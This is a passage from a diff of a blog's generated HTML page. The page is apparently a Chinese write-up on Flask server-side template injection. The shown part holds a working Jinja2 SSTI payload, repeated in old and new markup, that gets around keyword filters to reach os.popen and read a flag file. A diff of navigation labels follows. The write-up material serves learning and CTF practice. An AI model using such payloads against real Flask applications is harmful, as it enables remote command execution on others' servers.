空格</span></span><br><span class="line">&#123;%<span class="built_in">set</span> d=(c,c,<span class="built_in">dict</span>(get=a,item=a)|join,c,c)|join%&#125;  <span class="comment"># __getitem__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> dd=(c,c,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=a)|join,c,c)|join%&#125;   <span class="comment"># __init__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> ddd=(c,c,<span class="built_in">dict</span>(glob=a,als=a)|join,c,c)|join%&#125;   <span class="comment"># __globals__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> dddd=(c,c,<span class="built_in">dict</span>(buil=a,tins=a)|join,c,c)|join%&#125;   <span class="comment"># __builtins__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> e=(c,c,<span class="built_in">dict</span>(impo=a,rt=a)|join,c,c)|join%&#125;   <span class="comment"># __import__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> ee=(<span class="built_in">dict</span>(o=a,s=a)|join)|join%&#125;   <span class="comment"># os</span></span><br><span class="line">&#123;%<span class="built_in">set</span> eee=(<span class="built_in">dict</span>(po=a,pen=a)|join)|join%&#125;  <span class="comment"># popen</span></span><br><span class="line">&#123;%<span class="built_in">set</span> eeee=(<span class="built_in">dict</span>(cat=a)|join,cc,<span class="built_in">dict</span>(flag=a)|join)|join%&#125;  <span class="comment"># cat flag</span></span><br><span class="line">&#123;%<span class="built_in">set</span> f=(<span class="built_in">dict</span>(rea=a,d=a)|join)|join%&#125;  <span class="comment"># read</span></span><br><span class="line">&#123;&#123;x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> a=&#123;&#125;|select|string|<span class="hljs-built_in">list</span>%&#125;
+&#123;%<span class="hljs-built_in">set</span> ax=&#123;&#125;|select|string|<span class="hljs-built_in">list</span>%&#125;
+&#123;%<span class="hljs-built_in">set</span> aa=<span class="hljs-built_in">dict</span>(ssss=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> aaa=<span class="hljs-built_in">dict</span>(ssssss=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> aaaa=<span class="hljs-built_in">dict</span>(ss=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> aaaaa=<span class="hljs-built_in">dict</span>(sssss=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-built_in">dict</span>(pop=a)|join%&#125;   <span class="hljs-comment"># pop</span>
+&#123;%<span class="hljs-built_in">set</span> c=a|attr(b)(aa|length*aaa|length)%&#125;  <span class="hljs-comment"># _</span>
+&#123;%<span class="hljs-built_in">set</span> cc=a|attr(b)(aaaa|length*aaaaa|length)%&#125; <span class="hljs-comment"># 空格</span>
+&#123;%<span class="hljs-built_in">set</span> d=(c,c,<span class="hljs-built_in">dict</span>(get=a,item=a)|join,c,c)|join%&#125;  <span class="hljs-comment"># __getitem__</span>
+&#123;%<span class="hljs-built_in">set</span> dd=(c,c,<span class="hljs-built_in">dict</span>(<span class="hljs-keyword">in</span>=a,it=a)|join,c,c)|join%&#125;   <span class="hljs-comment"># __init__</span>
+&#123;%<span class="hljs-built_in">set</span> ddd=(c,c,<span class="hljs-built_in">dict</span>(glob=a,als=a)|join,c,c)|join%&#125;   <span class="hljs-comment"># __globals__</span>
+&#123;%<span class="hljs-built_in">set</span> dddd=(c,c,<span class="hljs-built_in">dict</span>(buil=a,tins=a)|join,c,c)|join%&#125;   <span class="hljs-comment"># __builtins__</span>
+&#123;%<span class="hljs-built_in">set</span> e=(c,c,<span class="hljs-built_in">dict</span>(impo=a,rt=a)|join,c,c)|join%&#125;   <span class="hljs-comment"># __import__</span>
+&#123;%<span class="hljs-built_in">set</span> ee=(<span class="hljs-built_in">dict</span>(o=a,s=a)|join)|join%&#125;   <span class="hljs-comment"># os</span>
+&#123;%<span class="hljs-built_in">set</span> eee=(<span class="hljs-built_in">dict</span>(po=a,pen=a)|join)|join%&#125;  <span class="hljs-comment"># popen</span>
+&#123;%<span class="hljs-built_in">set</span> eeee=(<span class="hljs-built_in">dict</span>(cat=a)|join,cc,<span class="hljs-built_in">dict</span>(flag=a)|join)|join%&#125;  <span class="hljs-comment"># cat flag</span>
+&#123;%<span class="hljs-built_in">set</span> f=(<span class="hljs-built_in">dict</span>(rea=a,d=a)|join)|join%&#125;  <span class="hljs-comment"># read</span>
+&#123;&#123;x|attr(dd)|attr(ddd)|attr(d)(dddd)|attr(d)(e)(ee)|attr(eee)(eeee)|attr(f)()&#125;&#125;</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927111652753.png" alt="image-20210927111652753"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章主要介绍了<code>Flask</code>的服务端模板注入.其漏洞成因大多数是因为程序员的偷懒或者安全意识较低.</p>
@@ -628,13 +836,13 @@
          
           <li><a href="/">Home</a></li>
          
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">Articles</a></li>
          
-          <li><a href="/categories/">categories</a></li>
+          <li><a href="/categories">Categories</a></li>
          
-          <li><a href="/tags/">tags</a></li>
+          <li><a href="/tags">Tags</a></li>
          
-          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li>
+          <li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li>
         
       </ul>
     </div>
@@ -686,13 +894,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </nav>
